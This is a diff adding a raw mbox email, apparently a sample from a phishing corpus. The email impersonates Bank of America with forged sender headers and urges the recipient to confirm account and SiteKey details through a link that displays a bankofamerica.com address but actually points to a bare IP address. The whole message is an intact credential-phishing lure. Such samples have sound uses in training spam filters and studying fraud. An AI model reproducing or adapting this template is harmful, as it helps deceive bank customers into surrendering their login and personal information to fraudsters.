@@ -1,0 +1,61 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <service101@bankofamerica.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id A929046924
+ for <user@login.example.com>; Sat, 10 Mar 2007 05:01:50 -0500 (EST)
+Received: from 172.20.1.6 (ns.ceip.spb.ru [217.15.22.5])
+ by mail.example.org (Postfix) with SMTP id 26ACC131F9D4
+ for <user@example.com>; Sat, 10 Mar 2007 05:01:49 -0500 (EST)
+Received: from 45.0.105.245 by ; Sat, 10 Mar 2007 12:00:47 +0200
+Message-ID: <OPJKWTFIJJDBIRYSWIRGZPTXQ@yahoo.com>
+From: "Bank of America Service" <service101@bankofamerica.com>
+Reply-To: "Bank of America Service" <service101@bankofamerica.com>
+To: user@example.com
+Subject: Please Update Your Profile - Personal Information Error
+Date: Sat, 10 Mar 2007 07:53:47 -0200
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--12482447426723138"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 951
+
+----12482447426723138
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<img src=3D"http://www.bankofamerica.com/images/mhd_reg_logo.gif">
+<style>
+text2 {
+	FONT-SIZE: 80%; COLOR: #333333; FONT-FAMILY: Verdana
+}
+</style>
+<br>
+<SPAN class=3Dtext2>Dear Bank of America Customer,<br><br>
+<br>During our regularly scheduled account maintenance and verification pr=
+ocedures,
+<br>we have detected a slight error in your account information.
+<br>To securely confirm your personal information please click on the link=
+ bellow:
+<br>
+<br><a href=3D"http://211.23.211.211/sitekey/sas/profile/step1.htm">http:/=
+/www.bankofamerica.com/sas/sitekey/profile/step1.htm</a>
+<br><br>Confirm Your Bank of America Account and SiteKey now to enjoy the =
+benefits of
+<br>online banking and finance to avoid identity theft and fraudulent acti=
+vities on
+<br>your account.
+<br><br><b>Note: We will be upgrading our yearly SSL EncryptedServer to pr=
+event fraudulent
+<br>activity.</b>
+<br><br>=A9 2007 Bank of America Corporation. All rights reserved.
+</span></html>
+
+----12482447426723138--
